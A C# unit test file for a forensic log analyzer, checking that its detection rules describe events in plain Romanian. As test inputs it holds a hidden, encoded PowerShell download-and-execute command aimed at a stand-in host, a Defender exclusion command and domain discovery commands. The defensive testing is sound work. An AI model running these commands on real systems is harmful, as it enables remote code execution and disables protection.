using System.Text.RegularExpressions;
using LogAnalyzer.Dfir.Analysis;
using LogAnalyzer.Dfir.Model;
using Xunit;
using static LogAnalyzer.Dfir.Tests.W11;
using static LogAnalyzer.Dfir.Tests.W14;

namespace LogAnalyzer.Dfir.Tests;

/// <summary>
/// Owner 2026-11-06: every finding told the way a non-specialist would say it. These rules tell their own story (<see cref="Finding.PlainWhat"/>): who/what/with what,
/// without event codes, SIDs, technique ids or rule ids. The text is built from the data the rule has, never by cleaning its own title.
/// </summary>
public class PlainWhatRulesTests
{
    private static void NoJargon(string text)
    {
        Assert.NotEmpty(text);
        Assert.False(Regex.IsMatch(text, @"\b\d{3,5}\b"), "event code or number in: " + text);
        Assert.DoesNotContain("S-1-5-", text);
        Assert.False(Regex.IsMatch(text, @"T\d{4}"), "technique id in: " + text);
        Assert.False(Regex.IsMatch(text, @"[A-Z]+-[A-Z]+"), "rule id in: " + text);
        Assert.DoesNotContain("vinovat", text, StringComparison.OrdinalIgnoreCase);
    }

    private static TimelineEvent Created(double m, string name = "labbackup", string by = "admin1") =>
        Sec(4720, m, ("TargetUserName", name), ("TargetDomainName", "LAB"), ("TargetSid", "S-1-5-21-1-2-3-1105"), ("SubjectUserName", by), ("SubjectDomainName", "LAB"));

    private static TimelineEvent Logon(double m, string name = "labbackup") =>
        Sec(4624, m, ("TargetUserName", name), ("TargetDomainName", "LAB"), ("TargetUserSid", "S-1-5-21-1-2-3-1105"), ("LogonType", "2"), ("IpAddress", "-"));

    [Fact]
    public void ACCOUNT_CREATED_says_who_created_it_and_that_it_was_never_used()
    {
        var f = One(Run([Created(0), Sec(4624, 1, ("TargetUserName", "someone.else"), ("TargetDomainName", "LAB"), ("TargetUserSid", "S-1-5-21-1-2-3-2001"), ("LogonType", "2"), ("IpAddress", "-"))]), "ACCOUNT-CREATED");
        Assert.Equal("Contul „labbackup” a fost creat de contul „admin1”; după creare nu apare nicio intrare cu acest cont în probele colectate", f.PlainWhat);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void ACCOUNT_ADDED_PRIVILEGED_GROUP_explains_what_administrators_can_do()
    {
        var added = Sec(4732, 2, ("MemberName", "CN=labbackup,CN=Users,DC=lab,DC=local"), ("MemberSid", "S-1-5-21-1-2-3-1105"), ("TargetUserName", "Administrators"),
            ("TargetSid", "S-1-5-32-544"), ("SubjectUserName", "admin1"), ("SubjectDomainName", "LAB"));
        var f = One(Run([Created(0), added]), "ACCOUNT-ADDED-PRIVILEGED-GROUP");
        Assert.StartsWith("Contul „labbackup” a fost pus în grupul „Administrators” (administratori: control total asupra calculatorului)", f.PlainWhat);
        Assert.Contains("de către contul „admin1”", f.PlainWhat);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void ACCOUNT_CREATED_THEN_USED_says_the_new_account_was_used_to_get_in()
    {
        var f = One(Run([Created(0), Logon(5)]), "ACCOUNT-CREATED-THEN-USED");
        Assert.Equal("Contul „labbackup”, creat în acest caz, a fost folosit după aceea pentru a intra pe calculator (o dată)", f.PlainWhat);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void CRED_BRUTEFORCE_is_a_whole_clause_with_the_count_the_account_and_the_source()
    {
        var fails = Enumerable.Range(0, 10).Select(i => Sec(4625, i, ("TargetUserName", "ana.pop"), ("IpAddress", "10.0.0.9"), ("WorkstationName", "Birou7")));
        var f = One(Correlation.Run(fails.ToList()), "CRED-BRUTEFORCE");
        Assert.Equal("Cineva a încercat de 10 ori o parolă greșită pentru contul „ana.pop”, de la calculatorul „Birou7” (adresa 10.0.0.9)", f.PlainWhat);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void PS_CMDLINE_SUSPICIOUS_says_hidden_and_what_the_encoded_command_does()
    {
        var enc = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"));
        var details = "\tHostName=ConsoleHost\n\tHostApplication=powershell.exe -nop -WindowStyle Hidden -EncodedCommand " + enc + "\n\tEngineVersion=5.1\n";
        var ev = Ev("Windows PowerShell", 400, 0, "", ("Data0", "Available"), ("Data1", "None"), ("Data2", details));
        var f = One(Correlation.Run([ev]), "PS-CMDLINE-SUSPICIOUS");
        Assert.StartsWith("a pornit PowerShell ascuns (fără fereastră vizibilă), cu o comandă codificată care face: IEX (New-Object Net.WebClient).DownloadString(", f.PlainWhat);
        Assert.False(Regex.IsMatch(f.PlainWhat, @"\b\d{3,5}\b"));
        Assert.DoesNotContain("S-1-5-", f.PlainWhat);
    }

    [Fact]
    public void DEF_TAMPER_names_the_folder_the_antivirus_was_told_to_skip()
    {
        var add = Sec(4688, 0, ("NewProcessName", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
            ("CommandLine", @"powershell Add-MpPreference -ExclusionPath C:\Users\bob\AppData\Local\Temp"), ("SubjectUserName", "bob"));
        var f = One(Correlation.Run([add]), "DEF-TAMPER");
        Assert.Equal(@"a slăbit antivirusul: l-a pus să nu mai verifice folderul „C:\Users\bob\AppData\Local\Temp”", f.PlainWhat);
        NoJargon(f.PlainWhat);
        var blocked = One(Correlation.Run([Ev("Microsoft-Windows-Windows Defender/Operational", 5013, 0)]), "DEF-TAMPER");
        Assert.Equal("Windows a blocat o încercare de a slăbi antivirusul Microsoft Defender", blocked.PlainWhat);
    }

    [Fact]
    public void LOG_TAMPER_says_which_log_was_deleted_and_what_it_holds()
    {
        var clear = Sec(1102, 0, ("SubjectUserName", "admin1"), ("SubjectDomainName", "LAB"));
        var f = One(Correlation.Run([clear]), "LOG-TAMPER");
        Assert.Equal("a șters jurnalul „Security” (jurnalul de securitate: lista cu cine a intrat pe calculator)", f.PlainWhat);
        Assert.Equal("admin1", f.User);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void PERSIST_SERVICE_USERPATH_names_the_service_and_the_program_it_starts()
    {
        var install = Sys(7045, 0, "Service Control Manager", ("ServiceName", "UpdSvc"), ("ImagePath", @"C:\ProgramData\upd\updsvc.exe"), ("AccountName", "LocalSystem"), ("StartType", "auto start"));
        var f = One(Correlation.Run([install]), "PERSIST-SERVICE-USERPATH");
        Assert.Equal("A fost instalat serviciul „UpdSvc”, care pornește programul „updsvc.exe” singur, la fiecare pornire a calculatorului, dintr-un folder în care orice utilizator poate scrie", f.PlainWhat);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void REMOTE_WINRM_says_remote_work_without_naming_the_protocol_internals()
    {
        var host = Sec(4688, 1, ("NewProcessName", @"C:\Windows\System32\wsmprovhost.exe"), ("SubjectUserName", "bob"), ("SubjectLogonId", "0x5"));
        var f = One(Run([host]), "REMOTE-WINRM");
        Assert.StartsWith("a lucrat de la distanță pe acest calculator (comenzi trimise prin rețea)", f.PlainWhat);
        Assert.DoesNotContain("wsmprovhost", f.PlainWhat, StringComparison.OrdinalIgnoreCase);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void DISCOVERY_BURST_says_who_what_rights_and_network_were_asked_and_keeps_the_typed_commands()
    {
        var events = new[]
        {
            Sec(4688, 16, ("NewProcessName", @"C:\Windows\System32\whoami.exe"), ("CommandLine", "whoami /all"), ("SubjectUserName", "bob")),
            Sec(4688, 16.1, ("NewProcessName", @"C:\Windows\System32\nltest.exe"), ("CommandLine", "nltest /dclist:corp"), ("SubjectUserName", "bob")),
            Sec(4688, 16.2, ("NewProcessName", @"C:\Windows\System32\net.exe"), ("CommandLine", "net group \"Domain Admins\" /domain"), ("SubjectUserName", "bob")),
        };
        var f = One(Run(events), "DISCOVERY-BURST");
        Assert.StartsWith("a rulat rapid 3 comenzi prin care a aflat cine este, ce drepturi are și ce calculatoare sunt în rețea (", f.PlainWhat);
        Assert.Contains("whoami /all", f.PlainWhat);
    }

    [Fact]
    public void AIRGAP_NETWORK_CONNECTED_and_NIC_ADDED_are_told_for_the_isolated_computer()
    {
        var net = Ev("Microsoft-Windows-NetworkProfile/Operational", 10000, 1, "Microsoft-Windows-NetworkProfile", ("Name", "lab.local"), ("Category", "1"));
        var nic = Ev("Microsoft-Windows-Kernel-PnP/Configuration", 400, 2, "Microsoft-Windows-Kernel-PnP", ("DeviceInstanceId", @"PCI\VEN_8086&DEV_15BB\3&11583659&0&FE"),
            ("ClassGuid", "{4d36e972-e325-11ce-bfc1-08002be10318}"), ("DriverDescription", "Intel Ethernet Connection"));
        var found = Go([net, nic], Classified());
        var c = One(found, "AIRGAP-NETWORK-CONNECTED");
        Assert.Equal("Calculatorul izolat a fost conectat la rețeaua „lab.local”", c.PlainWhat);
        NoJargon(c.PlainWhat);
        var n = One(found, "AIRGAP-NIC-ADDED");
        Assert.Equal("Windows a configurat pe calculatorul izolat placa „Intel Ethernet Connection”: o placă de rețea nouă sau reinstalată", n.PlainWhat);
        NoJargon(n.PlainWhat);
    }

    [Fact]
    public void AIRGAP_NIC_ADDED_for_a_virtual_card_says_it_does_not_necessarily_leave_the_computer()
    {
        var virt = Ev("Microsoft-Windows-Kernel-PnP/Configuration", 400, 2, "Microsoft-Windows-Kernel-PnP", ("DeviceInstanceId", @"ROOT\VMS_MP\0000"),
            ("ClassGuid", "{4d36e972-e325-11ce-bfc1-08002be10318}"), ("DriverDescription", "Hyper-V Virtual Ethernet Adapter"));
        var n = One(Go([virt], Classified()), "AIRGAP-NIC-ADDED");
        Assert.Equal("Windows a configurat pe calculatorul izolat placa „Hyper-V Virtual Ethernet Adapter”: o placă de rețea virtuală, care nu iese neapărat din calculator", n.PlainWhat);
    }

    [Fact]
    public void AIRGAP_PRINT_JOB_names_the_document_pages_and_printer()
    {
        var job = Ev("Microsoft-Windows-PrintService/Operational", 307, 3, "Microsoft-Windows-PrintService", ("Param2", "Plan.docx"), ("Param3", "bob"), ("Param4", "LAB-WS02"),
            ("Param5", "HP LaserJet"), ("Param6", "IP_10.0.0.5"), ("Param7", "20480"), ("Param8", "4"));
        var f = One(Go([job], Classified()), "AIRGAP-PRINT-JOB");
        Assert.Equal("a tipărit documentul „Plan.docx” (4 pagini) la imprimanta „HP LaserJet”", f.PlainWhat);
        NoJargon(f.PlainWhat);
    }

    [Fact]
    public void INCIDENT_CHAIN_tells_the_steps_in_order_each_in_plain_words()
    {
        var steps = new List<Finding>
        {
            new() { FindingId = "F-1", RuleId = "A-B", Title = "t", Description = "x", PlainWhat = "a slăbit antivirusul: l-a pus să nu mai verifice folderul „C:\\Temp”", User = "bob" },
            new() { FindingId = "F-2", RuleId = "C-D", Title = "t", Description = "x", PlainWhat = "Windows a înregistrat oprirea protecției antivirusului Microsoft Defender" },
            new() { FindingId = "F-3", RuleId = "E-F", Title = "t", Description = "x", PlainWhat = "a șters jurnalul „Security”", User = "bob" },
        };
        var s = Correlation.ChainStory(steps);
        Assert.Equal("Mai multe lucruri grave s-au petrecut unul după altul pe calculator: întâi utilizatorul cu contul „bob” a slăbit antivirusul: l-a pus să nu mai verifice folderul „C:\\Temp”; " +
                     "apoi Windows a înregistrat oprirea protecției antivirusului Microsoft Defender; la sfârșit utilizatorul cu contul „bob” a șters jurnalul „Security”", s);
    }
}
